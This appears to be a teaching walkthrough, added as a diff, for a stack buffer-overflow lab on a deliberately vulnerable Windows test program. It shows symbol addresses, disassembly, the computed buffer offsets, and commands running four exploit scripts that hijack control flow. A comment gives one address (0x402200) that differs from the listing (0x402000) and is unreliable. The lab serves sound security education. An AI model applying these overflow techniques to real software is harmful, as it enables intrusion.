@@ -1,0 +1,136 @@
+# We use msys on the IOCLA Windows 7 virtual machine.
+
+# We compile the executables.
+$ make
+gcc -Wall -g -Wno-unused-function -Wno-unused-variable -c -o bo_exploit.obj bo_exploit.c
+gcc -o bo_exploit.exe bo_exploit.obj
+
+# We determine the function and variable addresses in the executable.
+$ nm bo_exploit.exe
+[...]
+004010dc T _main
+00401000 T _mainCRTStartup
+00401b48 T _malloc
+00401b98 T _memcpy
+00401150 T _msys_crt0
+004012f0 T _printf
+004012f8 T _puts
+00401b38 T _realloc
+00401066 t _secret_func
+00402000 d _secret_message
+00401040 t _secret_param_func
+0040107a t _visible_func
+00401ba8 T _vsnprintf
+0040113d t done
+004050d8 i fthunk
+00405098 i fthunk
+0040503c i hname
+0040507c i hname
+00401126 t probe
+0040215c d skipchain.6
+00404010 b was_forked.5
+00403000 d was_init.4
+
+# secret_func is at address 0x401066
+# secret_param_func is at address 0x401040
+# secret_message is at addres 0x402200
+
+# We disassemble the object file to determine the buffer offset.
+$ objdump -d -M bo_exploit.obj
+
+bo_exploit.obj:     file format pe-i386
+
+
+Disassembly of section .text:
+
+00000000 <_secret_param_func>:
+   0:	55                   	push   ebp
+   1:	89 e5                	mov    ebp,esp
+   3:	83 ec 08             	sub    esp,0x8
+   6:	81 7d 08 78 56 34 12 	cmp    DWORD PTR [ebp+0x8],0x12345678
+   d:	75 15                	jne    24 <_secret_param_func+0x24>
+   f:	81 7d 0c 01 ef cd ab 	cmp    DWORD PTR [ebp+0xc],0xabcdef01
+  16:	75 0c                	jne    24 <_secret_param_func+0x24>
+  18:	c7 04 24 12 00 00 00 	mov    DWORD PTR [esp],0x12
+  1f:	e8 00 00 00 00       	call   24 <_secret_param_func+0x24>
+  24:	c9                   	leave  
+  25:	c3                   	ret    
+
+00000026 <_secret_func>:
+  26:	55                   	push   ebp
+  27:	89 e5                	mov    ebp,esp
+  29:	83 ec 08             	sub    esp,0x8
+  2c:	c7 04 24 26 00 00 00 	mov    DWORD PTR [esp],0x26
+  33:	e8 00 00 00 00       	call   38 <_secret_func+0x12>
+  38:	c9                   	leave  
+  39:	c3                   	ret    
+
+0000003a <_visible_func>:
+  3a:	55                   	push   ebp
+  3b:	89 e5                	mov    ebp,esp
+  3d:	83 ec 68             	sub    esp,0x68
+  40:	c7 45 f4 42 42 42 42 	mov    DWORD PTR [ebp-0xc],0x42424242
+  47:	c7 04 24 34 00 00 00 	mov    DWORD PTR [esp],0x34
+  4e:	e8 00 00 00 00       	call   53 <_visible_func+0x19>
+  53:	a1 00 00 00 00       	mov    eax,ds:0x0
+  58:	8b 40 04             	mov    eax,DWORD PTR [eax+0x4]
+  5b:	89 44 24 08          	mov    DWORD PTR [esp+0x8],eax
+  5f:	c7 44 24 04 80 00 00 	mov    DWORD PTR [esp+0x4],0x80
+  66:	00 
+  67:	8d 45 a8             	lea    eax,[ebp-0x58]
+  6a:	89 04 24             	mov    DWORD PTR [esp],eax
+  6d:	e8 00 00 00 00       	call   72 <_visible_func+0x38>
+  72:	8d 45 a8             	lea    eax,[ebp-0x58]
+  75:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax
+  79:	c7 04 24 50 00 00 00 	mov    DWORD PTR [esp],0x50
+  80:	e8 00 00 00 00       	call   85 <_visible_func+0x4b>
+  85:	81 7d f4 5a 5a 5a 5a 	cmp    DWORD PTR [ebp-0xc],0x5a5a5a5a
+  8c:	75 0c                	jne    9a <_visible_func+0x60>
+  8e:	c7 04 24 64 00 00 00 	mov    DWORD PTR [esp],0x64
+  95:	e8 00 00 00 00       	call   9a <_visible_func+0x60>
+  9a:	c9                   	leave  
+  9b:	c3                   	ret    
+
+0000009c <_main>:
+  9c:	55                   	push   ebp
+  9d:	89 e5                	mov    ebp,esp
+  9f:	83 ec 08             	sub    esp,0x8
+  a2:	83 e4 f0             	and    esp,0xfffffff0
+  a5:	b8 00 00 00 00       	mov    eax,0x0
+  aa:	83 c0 0f             	add    eax,0xf
+  ad:	83 c0 0f             	add    eax,0xf
+  b0:	c1 e8 04             	shr    eax,0x4
+  b3:	c1 e0 04             	shl    eax,0x4
+  b6:	89 45 fc             	mov    DWORD PTR [ebp-0x4],eax
+  b9:	8b 45 fc             	mov    eax,DWORD PTR [ebp-0x4]
+  bc:	e8 00 00 00 00       	call   c1 <_main+0x25>
+  c1:	e8 00 00 00 00       	call   c6 <_main+0x2a>
+  c6:	c7 04 24 76 00 00 00 	mov    DWORD PTR [esp],0x76
+  cd:	e8 00 00 00 00       	call   d2 <_main+0x36>
+  d2:	e8 63 ff ff ff       	call   3a <_visible_func>
+  d7:	b8 00 00 00 00       	mov    eax,0x0
+  dc:	c9                   	leave  
+  dd:	c3                   	ret    
+  de:	90                   	nop
+  df:	90                   	nop
+
+# buffer is at ebp-0x58
+# local variable is at ebp-0xc
+# return address is at ebp+4
+# variable offset is 0x58-0xc = 0x4c
+# return address offset is 0x58+4 = 0x5c
+
+
+# We use the Python exploit scripts to determine each exploit.
+
+# Overwrite the local variable. Print message "Comm-link online."
+python exploit_local_var.py | ./bo_exploit.exe
+
+# Overwrite return address. Print message "Channel open."
+python exploit_secret_func.py | ./bo_exploit.exe
+
+# Overwrite return address with function parameters. Print message "Systems functional."
+python exploit_secret_param_func.py | ./bo_exploit.exe
+
+# Print secret_message by overwriting with address of puts() function. Print message "Acknowledged H.Q."
+python exploit_print_secret_message.py | ./bo_exploit.exe
